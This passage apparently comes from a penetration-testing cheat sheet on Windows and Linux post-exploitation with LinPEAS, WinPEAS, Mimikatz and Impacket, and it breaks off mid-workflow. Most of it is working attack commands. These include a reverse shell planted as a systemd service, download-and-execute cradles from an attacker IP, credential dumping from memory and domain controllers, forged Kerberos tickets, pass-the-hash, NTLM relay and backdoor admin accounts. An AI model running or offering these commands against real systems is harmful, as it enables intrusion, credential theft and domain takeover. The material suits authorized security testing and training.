- **Exploit Development Fundamentals** - buffer overflows, ROP

---

### Post-Exploitation

#### LinPEAS (Linux Privilege Escalation Awesome Script)

**Overview and Installation:**

```bash
# Download latest version
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

# Alternative: Direct from GitHub
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh

# Make executable
chmod +x linpeas.sh

# Download to memory and execute (stealth)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

**Basic Usage:**

```bash
# Standard execution
./linpeas.sh

# Save output to file
./linpeas.sh | tee linpeas_output.txt

# Run with colored output in file
./linpeas.sh -a 2>&1 | tee linpeas_output.txt

# Run specific checks only
./linpeas.sh -s  # Superfast (skip time-consuming checks)
./linpeas.sh -o SysI,Devs  # Only System Information and Devices
```

**Advanced Options:**

```bash
# Full parameter list
./linpeas.sh -h

# Quiet mode (only show findings)
./linpeas.sh -q

# Export to different formats
./linpeas.sh -P  # Progress bar mode
./linpeas.sh -N  # No colors

# Skip network checks (faster on slow networks)
./linpeas.sh -n

# Verbose output with additional checks
./linpeas.sh -a

# Target specific areas
./linpeas.sh -o SysI          # System Information
./linpeas.sh -o Devs          # Available devices  
./linpeas.sh -o AvaSof        # Available software
./linpeas.sh -o ProCronSrvcTmrSocks  # Processes, cron, services, timers, sockets
./linpeas.sh -o Net           # Network information
./linpeas.sh -o UsrI          # User information
./linpeas.sh -o SofI          # Software information
./linpeas.sh -o IntFiles      # Interesting files
```

**Transfer Methods to Target:**

```bash
# Method 1: HTTP server on attacker
python3 -m http.server 8000
# On target:
wget http://10.10.14.5:8000/linpeas.sh
curl http://10.10.14.5:8000/linpeas.sh -o linpeas.sh

# Method 2: Direct execution from attacker
curl http://10.10.14.5:8000/linpeas.sh | bash

# Method 3: Base64 encoding (bypass file restrictions)
base64 -w0 linpeas.sh > linpeas_b64.txt
# On target:
echo "BASE64_STRING_HERE" | base64 -d | bash

# Method 4: Using netcat
# Attacker:
nc -lvnp 4444 < linpeas.sh
# Target:
cat < /dev/tcp/10.10.14.5/4444 > linpeas.sh

# Method 5: Via SCP (if SSH access)
scp linpeas.sh user@target:/tmp/linpeas.sh
```

**Key Findings to Review:**

```bash
# LinPEAS color coding [Inference: based on typical implementation]
# Red/Yellow: Critical findings - high priority
# Green: Informational
# Blue: Additional details

# Critical checks LinPEAS performs:
# 1. SUID/SGID binaries
# 2. Sudo privileges (sudo -l output)
# 3. Writable /etc/passwd or /etc/shadow
# 4. Cron jobs (system and user)
# 5. Writable service files
# 6. Kernel version and exploits
# 7. Installed software versions
# 8. Environment variables (especially PATH)
# 9. Mounted filesystems
# 10. Interesting files (/root/.ssh, .bash_history, etc.)
# 11. Database credentials
# 12. Capabilities
# 13. Running processes
# 14. Network connections
# 15. Password policies
```

**Filtering and Analysis:**

```bash
# Search output for specific keywords
./linpeas.sh | grep -i "password"
./linpeas.sh | grep -E "\.sh|\.py|\.pl"  # Find scripts
./linpeas.sh | grep -i "writable"

# Save sections separately
./linpeas.sh > full_output.txt
grep -A 50 "Sudo version" full_output.txt > sudo_info.txt
grep -A 100 "SUID" full_output.txt > suid_analysis.txt

# Extract only color-coded findings (red/yellow)
./linpeas.sh 2>&1 | grep -E "\[1;31m|\[1;33m"
```

**Common Privilege Escalation Paths LinPEAS Identifies:**

```bash
# Example findings and exploitation

# Finding: Writable /etc/passwd
echo 'hacker:$6$salt$hashedpass:0:0:root:/root:/bin/bash' >> /etc/passwd

# Finding: SUID binary (e.g., /usr/bin/find)
/usr/bin/find . -exec /bin/bash -p \; -quit

# Finding: Sudo entry (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'

# Finding: Writable service file
echo '[Service]
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"' > /etc/systemd/system/malicious.service
systemctl enable malicious.service
systemctl start malicious.service

# Finding: PATH hijacking opportunity
echo '/bin/bash' > /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
# Wait for privileged process to call 'ls'
```

#### WinPEAS (Windows Privilege Escalation Awesome Script)

**Download and Variants:**

```powershell
# WinPEAS variants
# winPEAS.exe - Compiled C# executable
# winPEAS.bat - Batch script version
# winPEASany.exe - .NET 4.0 version (more compatible)
# winPEASx64.exe - 64-bit optimized
# winPEASx86.exe - 32-bit version

# Download from attacker machine
# On Kali:
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat

# Verify target architecture
wmic os get osarchitecture
# Or:
echo %PROCESSOR_ARCHITECTURE%
```

**Transfer Methods to Windows Target:**

```powershell
# Method 1: PowerShell download
powershell -c "IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.5:8000/winPEAS.exe','C:\Windows\Temp\wp.exe')"

# Method 2: CertUtil (Windows native)
certutil -urlcache -f http://10.10.14.5:8000/winPEAS.exe wp.exe

# Method 3: BitsAdmin
bitsadmin /transfer mydownload /download /priority high http://10.10.14.5:8000/winPEAS.exe C:\Temp\wp.exe

# Method 4: PowerShell one-liner execution
powershell "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5:8000/winPEAS.bat')"

# Method 5: SMB transfer (if available)
# On Kali (setup SMB share):
impacket-smbserver share . -smb2support
# On Windows:
copy \\10.10.14.5\share\winPEAS.exe C:\Temp\wp.exe

# Method 6: Base64 encoding (bypass AV)
# On Kali:
base64 -w0 winPEAS.exe > winpeas_b64.txt
# On Windows:
certutil -decode encoded.txt winpeas.exe
```

**Basic Usage:**

```cmd
# Standard execution
winPEAS.exe

# Run specific checks
winPEAS.exe cmd                # Fast checks
winPEAS.exe cmd searchfast     # Fast search
winPEAS.exe systeminfo         # System information only

# Save output
winPEAS.exe > output.txt
winPEAS.exe cmd > results.txt 2>&1

# Quiet mode
winPEAS.exe quiet

# Full mode (all checks)
winPEAS.exe all

# Run without waiting
start /B winPEAS.exe > output.txt
```

**PowerShell Execution:**

```powershell
# Run WinPEAS.exe from PowerShell
.\winPEAS.exe

# Execute with output redirection
.\winPEAS.exe | Out-File results.txt

# Execute batch version
cmd /c winPEAS.bat

# Download and execute in memory
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5:8000/winPEAS.bat')

# Bypass execution policy
powershell -ep bypass -c ".\winPEAS.exe"
```

**Advanced Options and Filtering:**

```cmd
# Check specific categories
winPEAS.exe applicationinfo          # Installed applications
winPEAS.exe windowscreds             # Windows credentials
winPEAS.exe filesinfo                # Interesting files
winPEAS.exe eventsinfo               # Event logs analysis
winPEAS.exe userinfo                 # Current user privileges

# Color output control
winPEAS.exe notcolor                 # Disable colors (better for file output)

# Search specific patterns
winPEAS.exe searchfast filespassword # Search for password in filenames
```

**Key Findings WinPEAS Identifies:**

```powershell
# Critical Windows privilege escalation vectors:

# 1. Unquoted Service Paths
# Finding: Service with unquoted path and spaces
sc qc "Vulnerable Service"
# Path: C:\Program Files\My Service\service.exe
# Exploit: Place executable in C:\Program.exe

# 2. Weak Service Permissions
# Finding: SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS for current user
sc config "VulnService" binPath= "C:\Temp\reverse.exe"
sc stop "VulnService"
sc start "VulnService"

# 3. AlwaysInstallElevated
# Finding: Registry keys set to 1
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Exploit: Create malicious MSI and install
msiexec /quiet /qn /i malicious.msi

# 4. Stored Credentials
# Finding: Credentials in cmdkey /list
cmdkey /list
# Exploit:
runas /savecred /user:Administrator "C:\Temp\reverse.exe"

# 5. Token Privileges (SeImpersonate, SeAssignPrimaryToken)
# Finding: Current user has these privileges
# Exploit: Use JuicyPotato, PrintSpoofer, RoguePotato

# 6. Writable Service Binary
# Finding: Service binary writable by current user
icacls "C:\Program Files\Service\service.exe"
# Replace with malicious binary

# 7. DLL Hijacking
# Finding: Missing DLLs in application directory
# Create malicious DLL with same name

# 8. Scheduled Tasks with Writable Binaries
schtasks /query /fo LIST /v
# Check if task executable is writable

# 9. Registry AutoRuns
# Finding: Writable registry autoruns
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```

**Output Analysis Best Practices:**

```powershell
# Save to file for analysis
winPEAS.exe notcolor > winpeas_output.txt

# Search for specific keywords
findstr /i "password" winpeas_output.txt
findstr /i "SeImpersonate" winpeas_output.txt
findstr /i "Modify" winpeas_output.txt
findstr /i "admin" winpeas_output.txt

# Extract sections
findstr /i /c:"[+]" winpeas_output.txt  # Show findings only
findstr /i /c:"[!]" winpeas_output.txt  # Show important notes
```

#### Mimikatz

**Overview:**

Mimikatz is a post-exploitation tool for Windows that extracts plaintext passwords, hashes, PIN codes, and Kerberos tickets from memory. [Unverified: Detection by antivirus is common; operational considerations required]

**Installation and Setup:**

```bash
# On Kali Linux
sudo apt update
sudo apt install mimikatz

# Or download latest from GitHub
wget https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip
unzip mimikatz_trunk.zip

# Mimikatz files:
# x64/mimikatz.exe - 64-bit version
# Win32/mimikatz.exe - 32-bit version
# mimilib.dll - Supporting library
```

**Transfer to Windows Target:**

```powershell
# Via PowerShell
$url = "http://10.10.14.5:8000/mimikatz.exe"
$output = "C:\Windows\Temp\m.exe"
Invoke-WebRequest -Uri $url -OutFile $output

# Via certutil
certutil -urlcache -f http://10.10.14.5:8000/mimikatz.exe m.exe

# Via SMB
copy \\10.10.14.5\share\mimikatz.exe C:\Temp\

# Execute from memory (Invoke-Mimikatz)
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5:8000/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```

**Basic Usage:**

```cmd
# Launch Mimikatz
mimikatz.exe

# Enable debug privileges (required for many commands)
privilege::debug

# Check if SeDebugPrivilege is enabled
# Output should show "Privilege '20' OK"

# Exit Mimikatz
exit
```

**Credential Dumping:**

```cmd
# Dump logon passwords from memory
mimikatz # sekurlsa::logonpasswords

# Dump specific authentication packages
mimikatz # sekurlsa::wdigest      # WDigest credentials
mimikatz # sekurlsa::kerberos     # Kerberos tickets
mimikatz # sekurlsa::msv          # NTLM hashes
mimikatz # sekurlsa::tspkg        # TsPkg credentials
mimikatz # sekurlsa::livessp      # LiveSSP credentials

# Dump all credential types
mimikatz # sekurlsa::logonpasswords full

# Alternative: Single command execution
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

**SAM Database Dumping:**

```cmd
# Dump local SAM hashes
mimikatz # lsadump::sam

# Dump SAM with SYSTEM privileges
mimikatz # token::elevate
mimikatz # lsadump::sam

# Dump from offline SAM hive
mimikatz # lsadump::sam /sam:SAM /system:SYSTEM

# Export SAM and SYSTEM hives
reg save HKLM\SAM SAM
reg save HKLM\SYSTEM SYSTEM
# Then use mimikatz offline:
mimikatz # lsadump::sam /sam:SAM /system:SYSTEM

# Dump domain cached credentials
mimikatz # lsadump::cache
```

**LSA Secrets Extraction:**

```cmd
# Dump LSA secrets
mimikatz # lsadump::secrets

# LSA secrets include:
# - Service account passwords
# - Scheduled task credentials
# - VPN credentials
# - Auto-logon passwords
# - Domain computer account password

# Patch LSA to allow plaintext password storage
mimikatz # misc::memssp
# After reboot, passwords stored in C:\Windows\System32\mimilsa.log
```

**Kerberos Ticket Manipulation:**

```cmd
# List Kerberos tickets in memory
mimikatz # sekurlsa::tickets

# Export all tickets to files
mimikatz # sekurlsa::tickets /export

# List cached Kerberos tickets (current user)
mimikatz # kerberos::list

# Export tickets (current user)
mimikatz # kerberos::list /export

# Purge tickets
mimikatz # kerberos::purge

# Pass-the-Ticket attack
# 1. Export ticket
mimikatz # sekurlsa::tickets /export

# 2. Import ticket
mimikatz # kerberos::ptt [0;3e7]-2-0-40e10000-Administrator@krbtgt-DOMAIN.LOCAL.kirbi

# 3. Verify injection
klist

# Golden Ticket creation (requires krbtgt hash)
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:NTLM_HASH /id:500 /ptt

# Silver Ticket creation
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:NTLM_HASH /ptt
```

**Pass-the-Hash:**

```cmd
# Pass-the-Hash with Mimikatz
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:NTLM_HASH /run:cmd.exe

# This opens new command prompt with injected credentials
# From that prompt, you can access resources:
dir \\DC01\C$
psexec \\DC01 cmd.exe

# Pass-the-Hash for specific service
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:HASH /run:"powershell.exe"
```

**DCSync Attack (Domain Controller Replication):**

```cmd
# Replicate domain controller data (requires DA or replication rights)
mimikatz # lsadump::dcsync /user:domain\Administrator
mimikatz # lsadump::dcsync /user:domain\krbtgt
mimikatz # lsadump::dcsync /domain:domain.local /all /csv

# Export all domain hashes
mimikatz # lsadump::dcsync /domain:domain.local /all /csv > domain_hashes.txt

# DCSync specific user
mimikatz # lsadump::dcsync /user:Administrator /domain:domain.local
```

**DPAPI (Data Protection API) Abuse:**

```cmd
# Dump DPAPI master keys
mimikatz # sekurlsa::dpapi

# Decrypt Chrome passwords (example)
mimikatz # dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data"

# Decrypt saved credentials
mimikatz # vault::list
mimikatz # vault::cred /patch
```

**Token Manipulation:**

```cmd
# List available tokens
mimikatz # token::list

# Elevate to SYSTEM
mimikatz # token::elevate

# Impersonate token
mimikatz # token::elevate /domainadmin

# Revert to original token
mimikatz # token::revert
```

**Mimikatz Evasion Techniques:**

```powershell
# Invoke-Mimikatz (PowerShell version)
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds

# SafetyKatz (minidump + Mimikatz)
# Creates process dump and runs Mimikatz offline
.\SafetyKatz.exe

# Obfuscated Mimikatz
# Use Invoke-Obfuscation to obfuscate Invoke-Mimikatz

# SharpKatz (C# port)
.\SharpKatz.exe --Command logonpasswords

# Pypykatz (Python implementation - run on Kali)
pypykatz lsa minidump lsass.dmp

# Create minidump with Task Manager
# Right-click lsass.exe → Create dump file
# Transfer dump to Kali and analyze:
pypykatz lsa minidump lsass.DMP
# Or use Mimikatz:
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

**Remote Mimikatz Execution:**

```powershell
# Via PsExec
psexec.exe \\TARGET -u domain\admin -p Password123 -c mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Via WMI
wmic /node:TARGET /user:domain\admin /password:Password123 process call create "cmd /c mimikatz.exe privilege::debug sekurlsa::logonpasswords > C:\output.txt"

# Via PowerShell Remoting
Invoke-Command -ComputerName TARGET -Credential (Get-Credential) -ScriptBlock {
    IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-Mimikatz.ps1')
    Invoke-Mimikatz -DumpCreds
}
```

**Output Parsing and Analysis:**

```bash
# On Kali, parse Mimikatz output
grep -i "Username" mimikatz_output.txt
grep -i "Password" mimikatz_output.txt
grep -i "NTLM" mimikatz_output.txt

# Extract hashes
grep "NTLM" mimikatz_output.txt | awk '{print $3}' > ntlm_hashes.txt

# Extract Kerberos tickets
grep -E "\.kirbi$" mimikatz_output.txt

# Format for hashcat
# Convert to format: username:hash
grep -A2 "Username" mimikatz_output.txt | paste - - - | awk '{print $3":"$9}' > creds.txt
```

#### Impacket

**Overview and Installation:**

```bash
# Install via apt (Kali Linux)
sudo apt update
sudo apt install impacket-scripts python3-impacket

# Or install via pip
pip3 install impacket

# Or install from GitHub (latest version)
git clone https://github.com/fortra/impacket.git
cd impacket
pip3 install .

# Verify installation
ls /usr/share/doc/python3-impacket/examples/
# Or if installed via pip:
impacket-psexec -h
```

**Core Impacket Tools:**

```bash
# Remote execution tools
impacket-psexec          # Execute commands via SMB/PSEXESVC
impacket-smbexec         # Execute commands via SMB (no service creation)
impacket-wmiexec         # Execute commands via WMI
impacket-dcomexec        # Execute commands via DCOM
impacket-atexec          # Execute commands via Task Scheduler

# Credential dumping tools
impacket-secretsdump     # Dump SAM, LSA, cached creds
impacket-mimikatz        # Alternative credential dumper

# Kerberos tools
impacket-getTGT          # Request TGT
impacket-GetNPUsers      # ASREPRoast attack
impacket-GetUserSPNs     # Kerberoast attack
impacket-ticketer        # Create Kerberos tickets
impacket-getArch         # Get remote architecture

# SMB tools
impacket-smbclient       # SMB client
impacket-smbserver       # Create SMB server
impacket-rpcdump         # RPC endpoint dump
impacket-samrdump        # SAM remote dump

# NTLM relay tools
impacket-ntlmrelayx      # NTLM relay attack

# Network scanning
impacket-nmapAnswerMachine  # Answer to NMAP scans
```

**psexec - Remote Command Execution:**

```bash
# Basic usage with credentials
impacket-psexec domain/username:password@target_ip

# Pass-the-Hash
impacket-psexec -hashes :NTLM_HASH domain/username@target_ip

# Local admin (no domain)
impacket-psexec username:password@target_ip

# Execute specific command
impacket-psexec domain/user:pass@target 'whoami'
impacket-psexec domain/user:pass@target 'ipconfig'

# Different service name (evasion)
impacket-psexec -service-name CustomSvc domain/user:pass@target

# Upload and execute binary
impacket-psexec -c reverse.exe domain/user:pass@target
```

**smbexec - Stealthier Remote Execution:**

```bash
# Basic usage (creates temp files, not services)
impacket-smbexec domain/username:password@target_ip

# Pass-the-Hash
impacket-smbexec -hashes :NTLM_HASH domain/username@target_ip

# Different share (default is ADMIN$)
impacket-smbexec -share C$ domain/user:pass@target

# Specify mode (SHARE or SERVER)
impacket-smbexec -mode SHARE domain/user:pass@target
```

**wmiexec - WMI-Based Execution:**

```bash
# Basic usage (semi-interactive shell)
impacket-wmiexec domain/username:password@target_ip

# Pass-the-Hash
impacket-wmiexec -hashes :NTLM_HASH domain/username@target_ip

# Execute single command
impacket-wmiexec domain/user:pass@target "ipconfig /all"

# Disable output (faster)
impacket-wmiexec -nooutput domain/user:pass@target "net user hacker Pass123 /add"

# Use different namespace
impacket-wmiexec -namespace "root\cimv2" domain/user:pass@target
```

**secretsdump - Credential Dumping:**

```bash
# Dump SAM, LSA, cached credentials
impacket-secretsdump domain/username:password@target_ip

# Pass-the-Hash
impacket-secretsdump -hashes :NTLM_HASH domain/username@target_ip

# Dump specific parts
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL  # Offline
impacket-secretsdump -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL  # NTDS.dit

# DCSync attack (domain controller)
impacket-secretsdump domain/username:password@domain_controller -just-dc
impacket-secretsdump domain/username:password@dc_ip -just-dc-user Administrator

# Output to file
impacket-secretsdump domain/user:pass@target -outputfile hashes

# NTDS extraction with VSS
impacket-secretsdump -use-vss domain/user:pass@dc_ip -just-dc-ntlm

# Target specific user
impacket-secretsdump domain/user:pass@dc -just-dc-user krbtgt
```

**GetNPUsers - ASREPRoast Attack:**

```bash
# Request AS-REP for users without Kerberos pre-auth
impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat -outputfile hashes.txt

# Single user
impacket-GetNPUsers domain.local/username -no-pass

# With domain credentials
impacket-GetNPUsers domain.local/user:password -request

# Check specific user
impacket-GetNPUsers domain.local/testuser -no-pass -dc-ip 10.10.10.100

# Crack extracted hashes
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
```

**GetUserSPNs - Kerberoast Attack:**

```bash
# Request service tickets for accounts with SPNs
impacket-GetUserSPNs domain.local/username:password -request

# Output to file
impacket-GetUserSPNs domain.local/user:pass -request -outputfile kerberoast_hashes.txt

# Specific domain controller
impacket-GetUserSPNs domain.local/user:pass -dc-ip 10.10.10.100 -request

# Request for specific user
impacket-GetUserSPNs domain.local/user:pass -request-user svc_sql

# Crack extracted tickets
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

**smbclient - SMB Share Access:**

```bash
# Interactive SMB client
impacket-smbclient domain/username:password@target_ip

# List shares
impacket-smbclient domain/username:password@target_ip -list

# Pass-the-Hash
impacket-smbclient -hashes :NTLM_HASH domain/username@target_ip

# Access specific share
impacket-smbclient domain/user:pass@target_ip -share C$

# Commands within smbclient
# shares - list shares
# use SHARENAME - access share
# ls - list files
# cd - change directory
# get - download file
# put - upload file
# rm - delete file
```

**smbserver - Create SMB Share:**

```bash
# Create SMB share (for file transfer)
impacket-smbserver share . -smb2support

# With authentication
impacket-smbserver share . -smb2support -username user -password pass

# Specify IP to listen on
impacket-smbserver share . -smb2support -ip 10.10.14.5

# Access from Windows target
net use \\10.10.14.5\share
copy file.txt \\10.10.14.5\share\
# Or:
copy \\10.10.14.5\share\tool.exe C:\Temp\
```

**ntlmrelayx - NTLM Relay Attack:**

```bash
# Basic NTLM relay to target
impacket-ntlmrelayx -t smb://target_ip

# Relay to multiple targets
impacket-ntlmrelayx -tf targets.txt

# Execute command upon successful relay
impacket-ntlmrelayx -t smb://target_ip -c "whoami"

# Dump SAM
impacket-ntlmrelayx -t smb://target_ip --dump-sam

# Create new user
impacket-ntlmrelayx -t smb://target_ip -c "net user hacker Pass123! /add"

# SMB2 support
impacket-ntlmrelayx -t smb://target_ip -smb2support

# SOCKS proxy
impacket-ntlmrelayx -t smb://target_ip -socks

# Combine with Responder for capturing
# Terminal 1:
sudo responder -I eth0 -wv
# Terminal 2:
impacket-ntlmrelayx -tf targets.txt -smb2support
```

**getTGT - Kerberos TGT Requests:**

```bash
# Request TGT
impacket-getTGT domain.local/username:password

# Save TGT to file
impacket-getTGT domain.local/username:password -dc-ip 10.10.10.100

# Use hash instead of password
impacket-getTGT domain.local/username -hashes :NTLM_HASH

# Export for use with other tools
export KRB5CCNAME=username.ccache

# Use TGT with other Impacket tools

impacket-psexec -k -no-pass domain.local/username@target.domain.local impacket-smbclient -k -no-pass domain.local/username@target.domain.local
````

**ticketer - Create Forged Kerberos Tickets:**

```bash
# Create Golden Ticket (requires krbtgt hash)
impacket-ticketer -nthash KRBTGT_NTLM_HASH -domain-sid S-1-5-21-... -domain domain.local Administrator

# Create Silver Ticket (for specific service)
impacket-ticketer -nthash SERVICE_NTLM_HASH -domain-sid S-1-5-21-... -domain domain.local -spn cifs/target.domain.local Administrator

# Specify ticket lifetime
impacket-ticketer -nthash HASH -domain-sid SID -domain domain.local -duration 3650 Administrator

# Custom user ID
impacket-ticketer -nthash HASH -domain-sid SID -domain domain.local -user-id 500 Administrator

# Add extra SIDs (SID history attack)
impacket-ticketer -nthash HASH -domain-sid SID -domain domain.local -extra-sid S-1-5-21-...-519 Administrator

# Use created ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass domain.local/Administrator@dc.domain.local
````

**atexec - Task Scheduler Execution:**

```bash
# Execute command via scheduled task
impacket-atexec domain/username:password@target_ip "whoami"

# Pass-the-Hash
impacket-atexec -hashes :NTLM_HASH domain/username@target_ip "ipconfig"

# Create reverse shell
impacket-atexec domain/user:pass@target "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')"

# Add user
impacket-atexec domain/user:pass@target "net user hacker Pass123! /add && net localgroup administrators hacker /add"
```

**dcomexec - DCOM-Based Execution:**

```bash
# Execute via DCOM (alternative to WMI/SMB)
impacket-dcomexec domain/username:password@target_ip

# Pass-the-Hash
impacket-dcomexec -hashes :NTLM_HASH domain/username@target_ip

# Different DCOM object
impacket-dcomexec -object MMC20 domain/user:pass@target

# Execute single command
impacket-dcomexec domain/user:pass@target "cmd /c whoami"
```

**rpcdump - RPC Endpoint Enumeration:**

```bash
# Enumerate RPC endpoints
impacket-rpcdump domain/username:password@target_ip

# Specific interface UUID
impacket-rpcdump domain/user:pass@target | grep -i "uuid"

# Output to file for analysis
impacket-rpcdump target_ip > rpc_endpoints.txt

# Enumerate without credentials (if available)
impacket-rpcdump target_ip
```

**samrdump - Remote SAM Enumeration:**

```bash
# Dump SAM remotely (if accessible)
impacket-samrdump domain/username:password@target_ip

# Enumerate users
impacket-samrdump target_ip

# Pass-the-Hash
impacket-samrdump -hashes :NTLM_HASH domain/username@target_ip
```

**Advanced Impacket Techniques:**

```bash
# Chain multiple Impacket tools

# 1. Get TGT
impacket-getTGT domain.local/user:pass
export KRB5CCNAME=user.ccache

# 2. Use TGT for Kerberoasting
impacket-GetUserSPNs -k -no-pass domain.local/user@dc.domain.local -request

# 3. Crack service ticket
hashcat -m 13100 ticket.txt wordlist.txt

# 4. Access with cracked credentials
impacket-psexec domain.local/svc_account:cracked_pass@target.domain.local

# Lateral movement workflow
# 1. Dump credentials from compromised host
impacket-secretsdump domain/user:pass@compromised_host

# 2. Use extracted hash for Pass-the-Hash
impacket-wmiexec -hashes :EXTRACTED_HASH domain/admin@next_target

# 3. Dump credentials from new target
impacket-secretsdump -hashes :HASH domain/admin@next_target

# DCSync and Golden Ticket workflow
# 1. DCSync krbtgt hash
impacket-secretsdump domain/admin:pass@dc -just-dc-user krbtgt

# 2. Get domain SID
impacket-secretsdump domain/admin:pass@dc | grep "Domain SID"

# 3. Create Golden Ticket
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local Administrator

# 4. Use Golden Ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass domain.local/Administrator@dc.domain.local
```

**Impacket with Proxychains:**

```bash
# Configure proxychains
sudo nano /etc/proxychains4.conf
# Add: socks5 127.0.0.1 1080

# Use Impacket through SOCKS proxy
proxychains impacket-psexec domain/user:pass@internal_target
proxychains impacket-secretsdump domain/user:pass@internal_dc
proxychains impacket-smbclient domain/user:pass@internal_share
```

**Troubleshooting and Error Handling:**

```bash
# Common errors and solutions

# Error: "SMB SessionError: STATUS_ACCESS_DENIED"
# Solution: Verify credentials, check if user has admin rights
impacket-psexec -debug domain/user:pass@target  # Enable debug output

# Error: "Kerberos SessionError: KRB_AP_ERR_SKEW"
# Solution: Clock skew issue - sync time with target
sudo ntpdate -s target_ip
# Or set time manually:
sudo date -s "2024-01-15 14:30:00"

# Error: "SMB SessionError: STATUS_PIPE_NOT_AVAILABLE"
# Solution: Try different execution method
impacket-smbexec domain/user:pass@target  # Instead of psexec
impacket-wmiexec domain/user:pass@target  # Or WMI

# Error: Connection timeout
# Solution: Check firewall, ensure ports are open
# SMB: 445
# WMI: 135, 49152-65535
# Kerberos: 88

# Verbose output for debugging
impacket-psexec -debug domain/user:pass@target
```

**Scripting with Impacket:**

```python
#!/usr/bin/env python3
# Custom Impacket script for credential dumping

from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5 import transport, samr
from impacket.examples.secretsdump import LocalOperations, SAMHashes

def dump_credentials(target, username, password, domain):
    """
    Dump credentials from target using Impacket
    """
    try:
        # Establish SMB connection
        conn = SMBConnection(target, target)
        conn.login(username, password, domain)
        
        print(f"[+] Connected to {target}")
        
        # Dump SAM hashes
        localOperations = LocalOperations(conn)
        bootKey = localOperations.getBootKey()
        
        SAMFileName = localOperations.saveSAM()
        SAMHashes(SAMFileName, bootKey, isRemote=True, perSecretCallback=lambda x: print(x))
        
        conn.close()
        
    except Exception as e:
        print(f"[-] Error: {e}")

# Usage
dump_credentials("10.10.10.100", "administrator", "Password123!", "DOMAIN")
```

**Integration with Other Tools:**

```bash
# Impacket + CrackMapExec workflow
crackmapexec smb 10.10.10.0/24 -u users.txt -p passwords.txt --continue-on-success
# Identify valid credentials, then:
impacket-secretsdump DOMAIN/user:pass@10.10.10.50

# Impacket + Responder + ntlmrelayx
# Terminal 1: Capture hashes
sudo responder -I eth0 -wv

# Terminal 2: Relay to targets
impacket-ntlmrelayx -tf targets.txt -smb2support --dump-sam

# Terminal 3: Trigger authentication
# Trigger via various methods (file access, printer bug, etc.)

# Impacket + Bloodhound
# 1. Collect data with bloodhound-python
bloodhound-python -u user -p pass -d domain.local -dc dc.domain.local -c all

# 2. Identify attack paths in Bloodhound GUI

# 3. Execute attack with Impacket
impacket-psexec domain/compromised_user:pass@target_from_bloodhound
```

**Post-Exploitation Workflow with All Tools:**

```bash
#!/bin/bash
# Comprehensive post-exploitation script

TARGET="10.10.10.100"
DOMAIN="domain.local"
USERNAME="user"
PASSWORD="Password123!"

echo "[*] Starting post-exploitation enumeration..."

# 1. Initial access verification
echo "[+] Testing access with psexec..."
impacket-psexec $DOMAIN/$USERNAME:$PASSWORD@$TARGET "whoami" 2>/dev/null
if [ $? -eq 0 ]; then
    echo "[+] Access confirmed!"
else
    echo "[-] Access failed!"
    exit 1
fi

# 2. Credential dumping
echo "[+] Dumping credentials with secretsdump..."
impacket-secretsdump $DOMAIN/$USERNAME:$PASSWORD@$TARGET -outputfile credentials

# 3. Linux enumeration (if Linux shell obtained)
echo "[+] Running LinPEAS..."
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh > linpeas_output.txt

# 4. Windows enumeration (if Windows shell obtained)
echo "[+] Deploying WinPEAS..."
impacket-smbserver share . -smb2support &
SMB_PID=$!
impacket-psexec $DOMAIN/$USERNAME:$PASSWORD@$TARGET "copy \\\\10.10.14.5\\share\\winPEAS.exe C:\\Temp\\wp.exe && C:\\Temp\\wp.exe > C:\\Temp\\output.txt"
# Retrieve results
impacket-smbclient $DOMAIN/$USERNAME:$PASSWORD@$TARGET -share C$ -command "get Temp\\output.txt winpeas_output.txt"
kill $SMB_PID

# 5. Mimikatz execution
echo "[+] Running Mimikatz..."
